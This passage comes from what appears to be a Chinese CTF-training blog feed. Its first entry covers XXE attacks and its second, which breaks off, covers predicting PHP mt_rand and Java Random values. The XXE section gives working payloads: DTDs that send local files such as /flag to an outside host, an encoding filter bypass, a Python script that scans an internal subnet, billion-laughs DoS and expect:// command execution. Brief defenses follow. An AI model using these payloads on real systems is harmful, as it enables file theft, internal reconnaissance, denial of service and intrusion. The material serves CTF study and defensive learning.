version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">roottag</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///含&lt;&gt;&amp;&quot;</span>等的文件<span class="hljs-meta-string">&quot;&gt;</span></span></span></span><br><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta"><span class="xml">&lt;!ENTITY % end &quot;</span>]]&gt;</span>&quot;&gt;</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">%dtd; ]&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">本地测试：</span><br><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">end</span> <span class="hljs-meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/a.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">%dtd; ]&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">&quot;%start;%file;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205153830896.png"></p><ul><li>服务端无回显</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%remote;%int;%send;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:2333?p=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p>SVG 格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE note [<br>&lt;!ENTITY file SYSTEM &quot;要读取的文件路径&quot; &gt;<br>]&gt;<br>&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;<br>  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;<br>&lt;/svg&gt;<br></code></pre></td></tr></table></figure><p>数据外带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!DOCTYPE root [<br>&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;<br>%remote;<br>]&gt;<br><br>shell.dtd<br>&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://i/?flag=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>xxe 绕过的 payload</p><p>当只过滤了 SYSTEM，PUBLIC 等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot;?&gt;<br><br>&lt;!DOCTYPE GVI [<br><br>    &lt;!ENTITY % XML &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;<br><br>    %XML;<br></code></pre></td></tr></table></figure><p>即为在 XML 实体中再定义一次 XML，可成功被解析，支持 dtd 数据外带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;<br>&lt;core&gt;<br>      &lt;message&gt;&amp;xxe;&lt;/message&gt;<br>&lt;/core&gt;<br></code></pre></td></tr></table></figure><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>主机发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment">#Origtional XML that the server accepts</span><br><span class="hljs-comment">#&lt;xml&gt;</span><br><span class="hljs-comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="hljs-comment">#&lt;/xml&gt;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_xml</span>(<span class="hljs-params">string</span>):</span><br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>    send_xml(xml)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_xml</span>(<span class="hljs-params">xml</span>):</span><br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    x = requests.post(<span class="hljs-string">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>    coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>] <span class="hljs-comment"># a little split to get only the base64 encoded value</span><br>    <span class="hljs-built_in">print</span> coded_string<br><span class="hljs-comment">#   print base64.b64decode(coded_string)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    <span class="hljs-keyword">try</span>:<br>        i = <span class="hljs-built_in">str</span>(i)<br>        ip = <span class="hljs-string">&#x27;10.0.0.&#x27;</span> + i<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        <span class="hljs-built_in">print</span> string<br>        build_xml(string)<br>    <span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>端口扫描</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">data</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://127.0.0.1:i/&quot;</span> [</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>爆破 i</p><h2 id="DOS-攻击"><a href="#DOS-攻击" class="headerlink" title="DOS 攻击"></a>DOS 攻击</h2><p>产生 3G 左右的垃圾文档，使服务器宕机</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;?xml version=&quot;<span class="hljs-number">1.0</span>&quot;?&gt;</span><br>     <span class="hljs-params">&lt;!DOCTYPE lolz [</span><br><span class="hljs-params">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol2 &quot;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol3 &quot;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol4 &quot;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol5 &quot;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol6 &quot;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol7 &quot;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol8 &quot;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol9 &quot;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;&quot;&gt;</span><br>     ]&gt;<br>     <span class="hljs-params">&lt;lolz&gt;</span><span class="hljs-variable">&amp;lol9</span>;<span class="hljs-params">&lt;/lolz&gt;</span><br></code></pre></td></tr></table></figure><p>在 Unix 中，使用/dev/random 文件内容代替实体，则用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h2><p>在开启了 expect 扩展的情况下，可以执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;expect://whoami&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><p>1.禁用外部实体</p><blockquote><p>libxml_disable_entity_loader(true)</p></blockquote><p>2.过滤非法输入</p><p>匹配关键字<code>&lt;!DOCTYPE &lt;!ENTITY SYSTEM PUBLIC</code></p><p>3.禁止外部实体的解析</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪随机数</title>
    <link href="/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>mt_scrand()//播种 Mersenne Twister 随机数生成器</p><p>mt_rand()//生成随机数</p></blockquote><p>mt_scrand()通过 seed 分发种子，通过 mt_rand()生成伪随机数</p><p>从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed 参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114013004978.png"></p><p>当种子不变时，生成的随机数是不变的，这就是伪随机数的漏洞所在</p><p>ctfshow25</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先我们要获得第一个随机数，根据条件，传入 r=0；使用工具对得到的第一个随机数进行逆推，<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>得到<strong>两个可能</strong>的随机数种子，即值<code>hexdec(substr(md5($flag), 0,8))</code></p><p>当<code>$_COOKIE[&#39;token&#39;]==(mt_rand()+mt_rand())</code>时得到 flag，由于前面已经执行了一次<code>mt_rand()</code>，我们需要得到后面两次的<code>mt_rand()</code>相加</p><p>编写脚本，对两个种子进行尝试，即得到两个<code>mt\_rand()+mt\_rand()</code>进行尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_scand(得到的种子值);<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand()+mt_rand();<br></code></pre></td></tr></table></figure><p>r=从页面得到的第一个随机数值 Cooke:token=脚本得到的两个随机数值相加</p><p>纵观整体难度不大，主要理解漏洞原理，以及题目使用的是后面两个随机值的相加</p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>强伪随机数 RNG 实现<code>java.security.SecureRandom</code>类，该类使用临时文件夹中大小，线程休眠时间等的值作为随机数种子；而弱伪随机数实现 PRNG<code>java.util.Random</code>类，默认使用当前时间作为种子，并且采用线性同余法计算下一个随机数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> learn;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">World</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Random r1 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r1.nextINT(12)=&quot;</span> + r1.nextInt(<span class="hljs-number">12</span>));<br><br>        Random r2 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r2.nextINT(12)=&quot;</span> + r2.nextInt(<span class="hljs-number">12</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到</p><blockquote><p>r1.nextINT(12)=5<br>r2.nextINT(12)=5</p></blockquote><p>无论执行多少次，结果都不会改变，Random 生成的随机数是伪随机数，这就可以预测<code>java.util.Random</code>。调用<code>random.nextInt</code>生成三个连续的随机数，根据前两个随机数就可以预测第三个随机数。这里我们跟一下源代码<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114164615749.png"></p><p>调用 next 方法，如果 bound 是非正，抛出异常</p><p>传参 31，<code>bound&amp;m)==0</code>判断 bound 是否为 2 的 x 次方，如果是，则 r 值取<code>(int)((bound * (long)r) &gt;&gt; 31)</code>，next(31)传了什么值？跟进 next<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114165211667.png"></p><p>Random.class 有三个常量</p><blockquote><p>private static final long multiplier = 0x5DEECE66DL;//进制是 25214903917</p><p>private static final long addend = 0xBL;//十进制是 11</p><p>private static final long mask = (1L &lt;&lt; 48) - 1;//十进制是 281474976710655，十六进制是 0xffffffffffff</p></blockquote><p>构造方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114202701125.png"></p><blockquote><p>oldseed 是(0x2F^0x5DEECE66D)&amp;0xffffffffffff 的值 0x5DEECE642， nextseed 为（oldseed*0x5DEECE66D+0xB）&amp; 0xffffffffffff 的值 0xBA2442955625，seed.compareAndSet(oldseed, nextseed)判断 nextseed 是否为预期的结果， 如果是预期结果返回 0xBA2442955625 &gt;&gt;&gt; (48 - 31)为 0x5D12214A；因此 next(31)为 0x5D12214A(十进制为 1561469258)</p></blockquote><p>就是说随机数种子 oldseed 和后一个随机数种子 nextseed 都被定义为 long 类型，返回为下一个种子右移 48-31=17 位后强制转换 int 的结果</p><p>while 里的 compareAndSet 方法比较当前种子是否为 oldseed，如果是的话就</p><p>更新为 nextseed，一般都会返回 true，下一个种子的更新算法在 do…while 结构里面，<code>nextseed=(oldseed * multiplier + addend) &amp; mask</code></p><p>//java.util.Random <a href="https://bbs.csdn.net/topics/390855511">https://bbs.csdn.net/topics/390855511</a></p><p>//AtomicLong<a href="https://blog.csdn.net/weixin_42146366/article/details/87820373">https://blog.csdn.net/weixin_42146366/article/details/87820373</a></p><ul><li>预测方法</li></ul><blockquote><p>如果把生成第一个随机数的种子定义为 seed1，seed2，seed3 往后顺延的话，seed1 右移 16 位就是第一个随机数的值，说明第一个随机数丢了 16 位，导致 seed1 就有 2 的 